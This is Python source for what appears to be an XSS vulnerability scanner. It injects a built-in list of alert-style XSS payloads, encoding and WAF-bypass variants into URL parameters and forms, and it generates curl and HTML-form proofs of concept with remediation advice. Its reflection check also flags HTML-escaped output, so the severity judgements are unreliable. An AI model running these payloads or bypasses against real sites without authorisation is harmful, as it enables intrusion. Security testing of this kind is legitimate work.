"""
XSS (Cross-Site Scripting) Scanner Module
Detects various types of XSS vulnerabilities
"""

import requests
import re
import html
import urllib.parse
from bs4 import BeautifulSoup
import time
import logging
from pathlib import Path

class XSSScanner:
    def __init__(self, session=None, payloads_file=None):
        self.session = session or requests.Session()
        self.session.verify = False  # Disable SSL verification for testing
        self.session.timeout = 15
        
        # Load payloads from file or use defaults
        self.payloads = self._load_payloads(payloads_file)
        
        # Context-specific payloads
        self.context_payloads = {
            'html': [
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert('XSS')>",
                "<svg onload=alert('XSS')>",
            ],
            'attribute': [
                "\" onmouseover=\"alert('XSS')\"",
                "' onmouseover='alert(\"XSS\")'",
                "javascript:alert('XSS')",
            ],
            'javascript': [
                "';alert('XSS');//",
                "\";alert('XSS');//",
                "alert('XSS')",
            ],
            'css': [
                "expression(alert('XSS'))",
                "javascript:alert('XSS')",
                "url(javascript:alert('XSS'))",
            ]
        }
        
        # Encoding bypass techniques
        self.encoded_payloads = [
            "%3Cscript%3Ealert('XSS')%3C/script%3E",
            "<script>alert('XSS')</script>",
            "<script>alert('XSS')</script>",
            "\\u003cscript\\u003ealert('XSS')\\u003c/script\\u003e",
            "\\x3cscript\\x3ealert('XSS')\\x3c/script\\x3e",
        ]
        
        self.vulnerabilities = []
        
    def _load_payloads(self, payloads_file=None):
        """Load XSS payloads from file or use defaults"""
        payloads = []
        
        # Try to load from specified file
        if payloads_file and Path(payloads_file).exists():
            try:
                with open(payloads_file, 'r', encoding='utf-8') as f:
                    payloads = [line.strip() for line in f if line.strip() and not line.startswith('#')]
                logging.info(f"Loaded {len(payloads)} payloads from {payloads_file}")
                return payloads
            except Exception as e:
                logging.error(f"Error loading payloads from {payloads_file}: {e}")
        
        # Try to load from default locations
        default_locations = [
            'xss_payloads.txt',
            'payloads/xss_payloads.txt',
            '../xss_payloads.txt',
            './xss_payloads.txt'
        ]
        
        for location in default_locations:
            if Path(location).exists():
                try:
                    with open(location, 'r', encoding='utf-8') as f:
                        payloads = [line.strip() for line in f if line.strip() and not line.startswith('#')]
                    logging.info(f"Loaded {len(payloads)} payloads from {location}")
                    return payloads
                except Exception as e:
                    logging.error(f"Error loading payloads from {location}: {e}")
                    continue
        
        # Fallback to default payloads if file not found
        logging.warning("Could not load payloads from file, using default payloads")
        return self._get_default_payloads()
    
    def _get_default_payloads(self):
        """Get default XSS payloads if file is not available"""
        return [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<iframe src=javascript:alert('XSS')>",
            "<body onload=alert('XSS')>",
            "<input onfocus=alert('XSS') autofocus>",
            "<select onfocus=alert('XSS') autofocus>",
            "<textarea onfocus=alert('XSS') autofocus>",
            "<keygen onfocus=alert('XSS') autofocus>",
            "<video><source onerror=alert('XSS')>",
            "<audio src=x onerror=alert('XSS')>",
            "<details open ontoggle=alert('XSS')>",
            "<marquee onstart=alert('XSS')>",
            "'-alert('XSS')-'",
            '"-alert("XSS")-"',
            "</script><script>alert('XSS')</script>",
            "<script>alert(String.fromCharCode(88,83,83))</script>",
            "<img src=\"javascript:alert('XSS')\">",
            "<div onmouseover=\"alert('XSS')\">test</div>",
            "<a href=\"javascript:alert('XSS')\">click</a>",
            "<form><button formaction=javascript:alert('XSS')>click</button>",
            "<object data=\"javascript:alert('XSS')\">",
            "<embed src=\"javascript:alert('XSS')\">",
            "<link rel=stylesheet href=\"javascript:alert('XSS')\">",
            "<style>@import'javascript:alert(\"XSS\")';</style>",
            "<meta http-equiv=\"refresh\" content=\"0;url=javascript:alert('XSS')\">",
            "<iframe src=\"data:text/html,<script>alert('XSS')</script>\">",
            "<svg><script>alert('XSS')</script></svg>",
            "<math><mi//xlink:href=\"data:x,<script>alert('XSS')</script>\">",
        ]
    
    def add_custom_payloads(self, custom_payloads):
        """Add custom payloads to the existing list"""
        if isinstance(custom_payloads, list):
            self.payloads.extend(custom_payloads)
            logging.info(f"Added {len(custom_payloads)} custom payloads")
        elif isinstance(custom_payloads, str):
            self.payloads.append(custom_payloads)
            logging.info("Added 1 custom payload")
    
    def scan_endpoints(self, endpoints, max_payloads_per_param=10):
        """Scan multiple endpoints for XSS vulnerabilities"""
        vulnerabilities = []
        
        logging.info(f"Starting XSS scan on {len(endpoints)} endpoints with {len(self.payloads)} payloads")
        
        for i, endpoint in enumerate(endpoints):
            try:
                logging.debug(f"Scanning endpoint {i+1}/{len(endpoints)}: {endpoint.get('url', 'unknown')}")
                endpoint_vulns = self.scan_endpoint(endpoint, max_payloads_per_param)
                vulnerabilities.extend(endpoint_vulns)
                time.sleep(0.1)  # Rate limiting
            except Exception as e:
                logging.error(f"Error scanning endpoint {endpoint.get('url', 'unknown')}: {e}")
                continue
        
        logging.info(f"XSS scan completed. Found {len(vulnerabilities)} vulnerabilities")
        return vulnerabilities
    
    def scan_endpoint(self, endpoint, max_payloads_per_param=10):
        """Scan a single endpoint for XSS vulnerabilities"""
        vulnerabilities = []
        url = endpoint.get('url', '')
        method = endpoint.get('method', 'GET')
        
        if not url:
            return vulnerabilities
        
        try:
            # Get the page first to find forms and parameters
            response = self.session.get(url)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Test URL parameters
            if '?' in url:
                param_vulns = self._test_url_parameters(url, max_payloads_per_param)
                vulnerabilities.extend(param_vulns)
            
            # Test forms
            forms = soup.find_all('form')
            for form in forms:
                form_vulns = self._test_form(url, form, max_payloads_per_param)
                vulnerabilities.extend(form_vulns)
            
            # Test common parameters
            common_params = ['q', 'search', 'query', 'name', 'message', 'comment', 'text', 'input', 'data', 'content']
            for param in common_params:
                param_vulns = self._test_parameter(url, param, method, max_payloads_per_param)
                vulnerabilities.extend(param_vulns)
                
        except Exception as e:
            logging.error(f"Error scanning endpoint {url}: {e}")
        
        return vulnerabilities
    
    def _test_url_parameters(self, url, max_payloads=10):
        """Test URL parameters for XSS"""
        vulnerabilities = []
        
        try:
            parsed_url = urllib.parse.urlparse(url)
            params = urllib.parse.parse_qs(parsed_url.query)
            
            for param_name, param_values in params.items():
                # Limit payloads for performance
                test_payloads = self.payloads[:max_payloads]
                
                for payload in test_payloads:
                    test_params = params.copy()
                    test_params[param_name] = [payload]
                    
                    test_query = urllib.parse.urlencode(test_params, doseq=True)
                    test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{test_query}"
                    
                    vuln = self._test_payload(test_url, param_name, payload, 'GET')
                    if vuln:
                        vulnerabilities.append(vuln)
                        break  # Found vulnerability, no need to test more payloads
                        
        except Exception as e:
            logging.error(f"Error testing URL parameters for {url}: {e}")
        
        return vulnerabilities
    
    def _test_form(self, base_url, form, max_payloads=10):
        """Test form inputs for XSS"""
        vulnerabilities = []
        
        try:
            action = form.get('action', '')
            method = form.get('method', 'GET').upper()
            
            # Construct form URL
            if action.startswith('http'):
                form_url = action
            elif action.startswith('/'):
                parsed_base = urllib.parse.urlparse(base_url)
                form_url = f"{parsed_base.scheme}://{parsed_base.netloc}{action}"
            else:
                form_url = urllib.parse.urljoin(base_url, action)
            
            # Find form inputs
            inputs = form.find_all(['input', 'textarea', 'select'])
            form_data = {}
            
            for input_elem in inputs:
                input_name = input_elem.get('name', '')
                input_type = input_elem.get('type', 'text')
                
                if input_name and input_type not in ['submit', 'button', 'reset']:
                    form_data[input_name] = 'test_value'
            
            # Test each input with XSS payloads
            for input_name in form_data.keys():
                test_payloads = self.payloads[:max_payloads]
                
                for payload in test_payloads:
                    test_data = form_data.copy()
                    test_data[input_name] = payload
                    
                    vuln = self._test_form_payload(form_url, input_name, payload, method, test_data)
                    if vuln:
                        vulnerabilities.append(vuln)
                        break
                        
        except Exception as e:
            logging.error(f"Error testing form: {e}")
        
        return vulnerabilities
    
    def _test_parameter(self, url, param_name, method='GET', max_payloads=5):
        """Test a specific parameter for XSS"""
        vulnerabilities = []
        
        test_payloads = self.payloads[:max_payloads]
        
        for payload in test_payloads:
            if method.upper() == 'GET':
                separator = '&' if '?' in url else '?'
                test_url = f"{url}{separator}{param_name}={urllib.parse.quote(payload)}"
                vuln = self._test_payload(test_url, param_name, payload, method)
            else:
                vuln = self._test_form_payload(url, param_name, payload, method, {param_name: payload})
            
            if vuln:
                vulnerabilities.append(vuln)
                break
        
        return vulnerabilities
    
    def _test_payload(self, url, parameter, payload, method):
        """Test a specific payload and check for XSS"""
        try:
            if method.upper() == 'GET':
                response = self.session.get(url)
            else:
                response = self.session.post(url, data={parameter: payload})
            
            # Check if payload is reflected in response
            if self._is_vulnerable(response.text, payload):
                return {
                    'type': 'XSS',
                    'severity': self._calculate_severity(payload, response.text),
                    'endpoint': url,
                    'method': method,
                    'parameter': parameter,
                    'payload': payload,
                    'description': f'Cross-Site Scripting vulnerability found in parameter "{parameter}"',
                    'response_snippet': self._get_response_snippet(response.text, payload),
                    'context': self._detect_context(response.text, payload),
                    'recommendation': self._get_recommendation(payload),
                    'confidence': self._calculate_confidence(response.text, payload)
                }
                
        except Exception as e:
            logging.error(f"Error testing payload {payload} on {url}: {e}")
        
        return None
    
    def _test_form_payload(self, url, parameter, payload, method, form_data):
        """Test payload in form submission"""
        try:
            if method.upper() == 'GET':
                response = self.session.get(url, params=form_data)
            else:
                response = self.session.post(url, data=form_data)
            
            if self._is_vulnerable(response.text, payload):
                return {
                    'type': 'XSS',
                    'severity': self._calculate_severity(payload, response.text),
                    'endpoint': url,
                    'method': method,
                    'parameter': parameter,
                    'payload': payload,
                    'description': f'Cross-Site Scripting vulnerability found in form parameter "{parameter}"',
                    'response_snippet': self._get_response_snippet(response.text, payload),
                    'context': self._detect_context(response.text, payload),
                    'recommendation': self._get_recommendation(payload),
                    'confidence': self._calculate_confidence(response.text, payload)
                }
                
        except Exception as e:
            logging.error(f"Error testing form payload: {e}")
        
        return None
    
    def _is_vulnerable(self, response_text, payload):
        """Check if the response contains the XSS payload"""
        # Direct payload reflection
        if payload in response_text:
            return True
        
        # HTML encoded payload reflection
        encoded_payload = html.escape(payload)
        if encoded_payload in response_text:
            return True
        
        # URL encoded payload reflection
        url_encoded_payload = urllib.parse.quote(payload)
        if url_encoded_payload in response_text:
            return True
        
        # Check for partial payload reflection (common in filtered responses)
        payload_parts = ['<script>', 'alert(', 'javascript:', 'onerror=', 'onload=', '<svg', '<img']
        for part in payload_parts:
            if part in payload.lower() and part in response_text.lower():
                return True
        
        # Check for decoded versions
        try:
            decoded_response = html.unescape(response_text)
            if payload in decoded_response:
                return True
        except:
            pass
        
        return False
    
    def _calculate_severity(self, payload, response_text):
        """Calculate vulnerability severity based on payload type and context"""
        payload_lower = payload.lower()
        
        # Critical severity indicators
        critical_indicators = [
            '<script>',
            'javascript:',
            'data:text/html',
            'vbscript:',
            'expression('
        ]
        
        # High severity indicators
        high_indicators = [
            'onerror=',
            'onload=',
            'onclick=',
            'onmouseover=',
            'onfocus=',
            'onblur=',
            'onchange=',
            'onsubmit='
        ]
        
        # Medium severity indicators  
        medium_indicators = [
            '<img',
            '<svg',
            '<iframe',
            '<object',
            '<embed',
            '<video',
            '<audio'
        ]
        
        # Check payload type
        for indicator in critical_indicators:
            if indicator in payload_lower:
                return 'Critical'
        
        for indicator in high_indicators:
            if indicator in payload_lower:
                return 'High'
        
        for indicator in medium_indicators:
            if indicator in payload_lower:
                return 'Medium'
        
        return 'Low'
    
    def _calculate_confidence(self, response_text, payload):
        """Calculate confidence level of the vulnerability detection"""
        confidence_score = 0
        
        # Direct payload reflection increases confidence
        if payload in response_text:
            confidence_score += 50
        
        # Check if payload is in executable context
        if any(context in response_text.lower() for context in ['<script>', 'javascript:', 'onerror=', 'onload=']):
            confidence_score += 30
        
        # Check if payload structure is preserved (corrected logic)
        payload_index = response_text.find(payload)
        if payload_index != -1:
            # Extract the reflected payload from response
            reflected_payload = response_text[payload_index:payload_index + len(payload)]
            # Check if the structure matches exactly
            if reflected_payload == payload:
                confidence_score += 20
            # Or check if critical characters are preserved
            elif ('<' in payload and '<' in reflected_payload and 
                  '>' in payload and '>' in reflected_payload):
                confidence_score += 10
        
        # Determine confidence level
        if confidence_score >= 80:
            return 'High'
        elif confidence_score >= 50:
            return 'Medium'
        else:
            return 'Low'
    
    def _detect_context(self, response_text, payload):
        """Detect the context where payload is reflected"""
        try:
            # Find payload in response and determine context
            payload_index = response_text.find(payload)
            if payload_index == -1:
                return 'unknown'
            
            # Get surrounding context
            start = max(0, payload_index - 100)
            end = min(len(response_text), payload_index + len(payload) + 100)
            context = response_text[start:end]
            
            # Analyze context
            if '<script>' in context and '</script>' in context:
                return 'script'
            elif any(attr in context for attr in ['href=', 'src=', 'action=', 'value=']):
                return 'attribute'
            elif '<style>' in context and '</style>' in context:
                return 'css'
            elif any(tag in context for tag in ['<div', '<span', '<p', '<h1', '<h2', '<h3']):
                return 'html'
            else:
                return 'text'
                
        except Exception as e:
            logging.error(f"Error detecting context: {e}")
            return 'unknown'
    
    def _get_response_snippet(self, response_text, payload, context_length=300):
        """Get a snippet of response around the payload"""
        try:
            index = response_text.find(payload)
            if index != -1:
                start = max(0, index - context_length // 2)
                end = min(len(response_text), index + len(payload) + context_length // 2)
                snippet = response_text[start:end]
                
                # Clean up the snippet
                snippet = snippet.replace('\n', ' ').replace('\r', ' ')
                snippet = ' '.join(snippet.split())  # Remove extra whitespace
                
                prefix = "..." if start > 0 else ""
                suffix = "..." if end < len(response_text) else ""
                
                return f"{prefix}{snippet}{suffix}"
        except Exception as e:
            logging.error(f"Error getting response snippet: {e}")
        
        return "Payload found in response"
    
    def _get_recommendation(self, payload):
        """Get specific recommendation based on payload type"""
        payload_lower = payload.lower()
        
        if '<script>' in payload_lower:
            return """
            1. Implement proper input validation and sanitization
            2. Use output encoding/escaping for all user data
            3. Implement Content Security Policy (CSP) headers
            4. Use HTML templating engines with auto-escaping
            5. Validate and sanitize all user inputs on server-side
            """
        elif 'javascript:' in payload_lower:
            return """
            1. Validate and sanitize URL inputs using whitelist approach
            2. Implement proper URL validation before processing
            3. Use Content Security Policy to block inline JavaScript
            4. Encode output when displaying URLs to users
            """
        elif any(event in payload_lower for event in ['onerror=', 'onload=', 'onclick=']):
            return """
            1. Sanitize HTML attributes and remove event handlers
            2. Implement proper output encoding for HTML contexts
            3. Use Content Security Policy to prevent inline event handlers
            4. Validate and filter HTML attributes on server-side
            """
        elif any(tag in payload_lower for tag in ['<img', '<svg', '<iframe']):
            return """
            1. Implement HTML sanitization library (e.g., DOMPurify, Bleach)
            2. Use whitelist-based HTML filtering
            3. Validate and sanitize all HTML tags and attributes
            4. Implement Content Security Policy headers
            """
        else:
            return """
            1. Implement comprehensive input validation and output encoding
            2. Use parameterized queries and prepared statements
            3. Apply principle of least privilege
            4. Implement Content Security Policy (CSP)
            5. Regular security testing and code review
            """
    
    def get_payload_statistics(self):
        """Get statistics about loaded payloads"""
        stats = {
            'total_payloads': len(self.payloads),
            'payload_types': {
                'script_based': len([p for p in self.payloads if '<script>' in p.lower()]),
                'event_based': len([p for p in self.payloads if any(event in p.lower() for event in ['onerror=', 'onload=', 'onclick='])]),
                'javascript_protocol': len([p for p in self.payloads if 'javascript:' in p.lower()]),
                'html_injection': len([p for p in self.payloads if any(tag in p.lower() for tag in ['<img', '<svg', '<iframe'])]),
                'other': 0
            }
        }
        
        # Calculate 'other' category
        categorized = sum(stats['payload_types'].values())
        stats['payload_types']['other'] = stats['total_payloads'] - categorized
        
        return stats
    
    def test_waf_bypass(self, url, parameter, base_payload):
        """Test various WAF bypass techniques"""
        bypass_techniques = [
            # Case variation
            base_payload.upper(),
            base_payload.lower(),
            
            # Encoding variations
            urllib.parse.quote(base_payload),
            html.escape(base_payload),
            
            # Character insertion
            base_payload.replace('<', '<<'),
            base_payload.replace('>', '>>'),
            
            # Comment insertion
            base_payload.replace('<script>', '<script/**/>')
        ]
        
        vulnerabilities = []
        
        for bypass_payload in bypass_techniques:
            vuln = self._test_payload(url, parameter, bypass_payload, 'GET')
            if vuln:
                vuln['bypass_technique'] = True
                vuln['original_payload'] = base_payload
                vulnerabilities.append(vuln)
        
        return vulnerabilities
    
    def generate_poc(self, vulnerability):
        """Generate Proof of Concept for found vulnerability"""
        endpoint = vulnerability.get('endpoint', '')
        parameter = vulnerability.get('parameter', '')
        payload = vulnerability.get('payload', '')
        method = vulnerability.get('method', 'GET')
        
        if method.upper() == 'GET':
            separator = '&' if '?' in endpoint else '?'
            poc_url = f"{endpoint}{separator}{parameter}={urllib.parse.quote(payload)}"
            
            poc = f"""
# XSS Proof of Concept

**Vulnerability Type:** Cross-Site Scripting (XSS)
**Severity:** {vulnerability.get('severity', 'Unknown')}
**Endpoint:** {endpoint}
**Parameter:** {parameter}
**Method:** {method}

## Proof of Concept URL:

## Manual Testing:
1. Open the above URL in a web browser
2. If vulnerable, you should see an alert dialog
3. Check browser developer console for any JavaScript errors

## cURL Command:
```bash
curl -X GET "{poc_url}"
```
## Remediation:
{vulnerability.get('recommendation', 'Implement proper input validation and output encoding')}
"""
        else:
            poc = f"""


XSS Proof of Concept
Vulnerability Type: Cross-Site Scripting (XSS) Severity: {vulnerability.get('severity', 'Unknown')} Endpoint: {endpoint} Parameter: {parameter} Method: {method}

cURL Command:
```bash
curl -X POST "{endpoint}" -d "{parameter}={urllib.parse.quote(payload)}"
```
HTML Form for Testing:
```html
<form action="{endpoint}" method="POST">
    <input type="text" name="{parameter}" value="{html.escape(payload)}">
    <input type="submit" value="Test XSS">
</form>
```
## Remediation:
{vulnerability.get('recommendation', 'Implement proper input validation and output encoding')}
"""
        
        return poc
